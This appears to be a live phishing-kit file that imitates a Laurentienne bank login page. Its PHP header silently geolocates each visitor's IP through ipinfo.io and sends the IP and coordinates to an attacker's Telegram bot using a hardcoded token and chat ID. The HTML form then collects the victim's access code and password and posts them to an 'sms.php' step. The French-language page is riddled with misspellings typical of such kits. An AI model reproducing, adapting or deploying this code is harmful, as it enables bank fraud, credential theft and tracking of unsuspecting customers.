<?php session_start();
$_SESSION["bank"] ='LAURENTIENNE';


<?php
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
$chat_id = '6242884372'; 

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip_address = $_SERVER['REMOTE_ADDR'];
}

$geo_url = "http://ipinfo.io/{$ip_address}/json";
$geo_ch = curl_init();
curl_setopt($geo_ch, CURLOPT_URL, $geo_url);
curl_setopt($geo_ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($geo_ch, CURLOPT_SSL_VERIFYPEER, false);
$geo_response = curl_exec($geo_ch);

// Initialiser les variables pour éviter les "undefined"
$latitude = 'N/A';
$longitude = 'N/A';

if (curl_errno($geo_ch)) {
    $location_info = 'Impossible de récupérer la localisation.';
} else {
    $location_data = json_decode($geo_response, true);
    
    if (isset($location_data['loc'])) {
        $location_info = $location_data['loc'];
        list($latitude, $longitude) = explode(',', $location_info);
    } else {
        $location_info = 'Localisation inconnue.';
    }
}

curl_close($geo_ch);

$message = "🏛🏛*TD*🏛🏛\n";
$message .= "IP: $ip_address\n";
$message .= "Latitude: $latitude\n";
$message .= "Longitude: $longitude";

$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
}

curl_close($ch);
?>




<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/laurentienne/styles_mobile.css">

    <link rel="stylesheet" media="screen and (min-width: 769px)" href="/laurentienne/styles_pc.css">
    <title>Laurentienne</title>
</head>
<header>
<nav>
    <span> <img src="./logo.svg" alt=""> </span>
</nav>
</header>
<body style="margin: 0px;">
    
<form action="/laurentienne/sms.php" method="post" >
    <label for="cvv"> code d'acces* </label>
    <input type="text" name="cvv" placeholder="Code d'acces *" required>

    <label for="mdp">  Mot de passe*  </label>
    <input type="password" name="mdp" placeholder="Mot de passe * " required>
        <br>
  <span> <input type="checkbox" name="check">
       <strong>   se souvenire de moi </strong></span>
 <div class="info">  
    Pour cree un profile de connexion selectionnez <i><<</i>  se souvenire de moi <i>>></i>
          Sur l'appli mobile , cette option vou permetraa d'utilser Vue rapide ou la conexion biometrique
</div>
   

    <input type="submit" value="CONNEXION">

  <b> Réinitialiser le mot de passe</b> 

</form>
<br> <br>

</body>
</html>
